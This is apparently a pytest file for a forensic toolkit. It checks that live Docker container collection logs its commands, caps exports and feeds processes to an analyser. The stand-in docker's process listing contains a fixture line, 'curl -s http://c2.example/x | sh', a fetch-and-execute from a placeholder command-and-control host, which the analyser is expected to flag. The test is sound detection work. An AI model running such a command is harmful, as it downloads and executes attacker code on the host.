"""Gandalf's live container capture (gandalf.sh -l, gandalf.py -L): both collectors ask the runtime about
its running containers, audit every command as "ran", cut exports at GANDALF_CONTAINER_EXPORT_MAX, and
Elrond reads the processes into container_processes.csv. Run against a stand-in docker on PATH."""
import csv
import os
import subprocess
import sys
import types
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
sys.path.append(str(REPO / "src" / "analysis"))

from dernvale.process import linux_artefacts as la  # noqa: E402

CID = "4f1c9e2ab3d7" + "0" * 52
FAKE_DOCKER = f"""#!/bin/sh
case "$1" in
  ps) echo {CID}; echo 'NOT-AN-ID' ;;
  inspect) echo '[{{"Name": "/lab-miner", "Config": {{"Image": "alpine:3.20"}}}}]' ;;
  top) printf 'PID PPID USER ELAPSED COMMAND\\n4242 4200 root 01:02 sh -c curl -s http://c2.example/x | sh\\n4250 4242 root 00:10 sleep 600\\n' ;;
  export) head -c 3000000 /dev/zero ;;
esac
"""


def stand_in(tmp_path: Path) -> dict:
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    (bin_dir / "docker").write_text(FAKE_DOCKER)
    (bin_dir / "docker").chmod(0o755)
    return {**os.environ, "PATH": f"{bin_dir}:/usr/bin:/bin", "GANDALF_CONTAINER_EXPORT_MAX": "1000000"}


def check_capture(host: Path) -> None:
    folder = host / "artefacts" / "live_containers" / "docker" / CID[:12]
    assert sorted(p.name for p in folder.iterdir()) == ["export.tar", "inspect.json", "top.txt"]
    assert (folder / "export.tar").stat().st_size == 1000000
    assert list((host / "artefacts" / "live_containers" / "docker").iterdir()) == [folder]  # the bad id skipped
    with open(host / "log.audit", newline="") as fh:
        audit = [(r["artefact"], r["collected"]) for r in csv.DictReader(fh)]
    assert (f"docker inspect {CID}", "ran") in audit and (f"docker top {CID}", "ran") in audit
    assert (f"docker export {CID} (cut at 1000000 bytes)", "ran") in audit


def test_bash_collector(tmp_path):
    host = tmp_path / "LIVEHOST"
    (host / "artefacts").mkdir(parents=True)
    (host / "log.audit").write_text("datetime,hostname,artefact,collected\n")
    script = REPO / "src" / "acquisition" / "bash" / "gandalf.sh"
    functions = subprocess.run(["sed", "-n", "/^log_live() {/,/^# Collect memory dump/p", str(script)],
                               stdout=subprocess.PIPE, check=True).stdout.decode()
    subprocess.run(["bash", "-c", functions + '\ncollect_live_containers "$1" LIVEHOST "$1/log.audit"', "_", str(host)],
                   env=stand_in(tmp_path), check=True)
    check_capture(host)


def test_python_collector_and_elrond(tmp_path, monkeypatch):
    collector = types.ModuleType("collector")
    source = (REPO / "src" / "acquisition" / "python" / "collect_artefacts-py").read_text()
    exec(compile(source, "collect_artefacts-py", "exec"), collector.__dict__)
    host = tmp_path / "LIVEHOST"
    (host / "artefacts").mkdir(parents=True)
    (host / "log.audit").write_text("datetime,hostname,artefact,collected\n")
    for key, value in stand_in(tmp_path).items():
        monkeypatch.setenv(key, value)
    collector.collect_live_containers(str(host / "artefacts"), str(host))
    check_capture(host)

    # As Elrond's Gandalf ingest places it: raw/live_containers/<runtime>/<id>/
    out = tmp_path / "out"
    raw = out / "HOST" / "artefacts" / "raw" / "live_containers" / "docker" / CID[:12]
    raw.mkdir(parents=True)
    for name in ("inspect.json", "top.txt"):
        (raw / name).write_bytes((host / "artefacts" / "live_containers" / "docker" / CID[:12] / name).read_bytes())
    assert la.process_linux_artefact("", "'HOST'", str(out) + "/", "HOST::Linux", "/", "processing", str(raw / "top.txt"))
    assert not la.is_linux_artefact(str(raw / "inspect.json"))
    with open(out / "HOST" / "artefacts" / "cooked" / "container_processes.csv", newline="") as fh:
        rows = list(csv.DictReader(fh))
    assert [(r["PID"], r["Name"], r["Image"], r["Flag"]) for r in rows] == [
        ("4242", "lab-miner", "alpine:3.20", "suspicious command"), ("4250", "lab-miner", "alpine:3.20", "")]
    assert rows[0]["Command"] == "sh -c curl -s http://c2.example/x | sh"


def test_off_by_default():
    source = (REPO / "src" / "acquisition" / "python" / "collect_artefacts-py").read_text()
    assert "\nLIVE_CONTAINERS = False\n" in source
    assert 'LIVE_CONTAINERS=false' in (REPO / "src" / "acquisition" / "bash" / "gandalf.sh").read_text()
